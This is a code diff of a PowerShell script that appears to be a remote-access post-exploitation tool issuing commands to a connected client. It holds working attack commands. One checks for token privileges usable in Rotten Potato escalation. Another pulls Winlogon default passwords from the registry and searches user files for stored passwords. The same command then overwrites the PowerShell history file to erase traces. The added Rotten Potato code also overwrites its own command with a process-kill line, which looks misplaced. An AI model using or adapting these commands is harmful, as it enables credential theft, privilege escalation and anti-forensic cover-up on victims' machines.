@@ -478,8 +478,12 @@ While($Client.Connected)
         If($my_choise -eq "RottenP" -or $my_choise -eq "rotten")
         {
           write-host " Search for Rotten Potato Vulnerability." -ForegroundColor Blue -BackgroundColor White;
+          write-host " [i] Client Must be executed without 'ADMIN' Privs for correct report information." -ForegroundColor Green;
           write-host " https://areyou1or0.blogspot.com/2019/06/rotten-potato-privilege-escalation-by.html" -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
           $Command = "cmd /R whoami /priv|findstr /i /C:`"SeImpersonatePrivilege`" /C:`"SeAssignPrimaryPrivilege`" /C:`"SeTcbPrivilege`" /C:`"SeBackupPrivilege`" /C:`"SeRestorePrivilege`" /C:`"SeCreateTokenPrivilege`" /C:`"SeLoadDriverPrivilege`" /C:`"SeTakeOwnershipPrivilege`" /C:`"SeDebugPrivileges`" `> WeakDirs.txt;`$check_ACL = get-content WeakDirs.txt|findstr /i /C:`"Enabled`";If(`$check_ACL){echo `"[i] Rotten Potato Vulnerable Settings Found ..`" `> test.txt;Get-Content test.txt;Remove-Item test.txt;Get-Content WeakDirs.txt;remove-item WeakDirs.txt -Force}else{echo `"   [i] None Weak Permissions Found [ Rotten Potato ] ..`" `> test.txt;Get-Content test.txt;Remove-Item test.txt -Force;Remove-Item WeakDirs.txt -Force}";
+
+            $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R taskkill /F /IM $Proc_name `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
+
        }
         If($my_choise -eq "Return" -or $my_choise -eq "return" -or $my_choise -eq "cls" -or $my_choise -eq "Modules" -or $my_choise -eq "modules" -or $my_choise -eq "clear")
         {
@@ -976,7 +980,7 @@ While($Client.Connected)
         write-host " - Directory to search recursive (`$env:userprofile): " -NoNewLine;
         $Recursive_search = Read-Host;
         write-host " [warning] This Function Might Take aWhile To Complete .." -ForegroundColor red -BackGroundColor white;write-host "`n`n";
-        $Command = "echo `"[WinLogon]`" `> `$env:tmp\passwd.txt;cmd /R reg query `"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`" /v DefaultUserName `>`> `$env:tmp\passwd.txt;cmd /R reg query `"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`" /v DefaultPassword `>`> `$env:tmp\passwd.txt;echo `"[List Passwords in Text|Log Files]`" `>`> `$env:tmp\passwd.txt;cd $Recursive_search|findstr /s /C:`"passwd`" *.txt *.log `>`> `$env:tmp\passwd.txt;cd $Recursive_search|findstr /s /C:`"password`" *.txt *.log `>`> `$env:tmp\passwd.txt;cd $Recursive_search|findstr /s /C:`"pass`" *.txt *.log `>`> `$env:tmp\passwd.txt;Get-Content `$env:tmp\passwd.txt;Remove-Item `$env:tmp\passwd.txt -Force;echo `"Forensic null factor`" `> `$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt;cd `$env:tmp";
+        $Command = "echo `"[i] [WinLogon Creds]`" `> `$env:tmp\passwd.txt;cmd /R reg query `"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`" /v DefaultUserName `>`> `$env:tmp\passwd.txt;cmd /R reg query `"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`" /v DefaultPassword `>`> `$env:tmp\passwd.txt;echo `"[i] [List of Passwords in Text|Log Files]`" `>`> `$env:tmp\passwd.txt;cd $Recursive_search|findstr /s /C:`"passwd`" *.txt *.log `>`> `$env:tmp\passwd.txt;cd $Recursive_search|findstr /s /C:`"password`" *.txt *.log `>`> `$env:tmp\passwd.txt;cd $Recursive_search|findstr /s /C:`"pass`" *.txt *.log `>`> `$env:tmp\passwd.txt;Get-Content `$env:tmp\passwd.txt;Remove-Item `$env:tmp\passwd.txt -Force;echo `"Forensic null factor`" `> `$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt;cd `$env:tmp";
       }
       If($choise -eq "ListDir" -or $choise -eq "dir")
       {
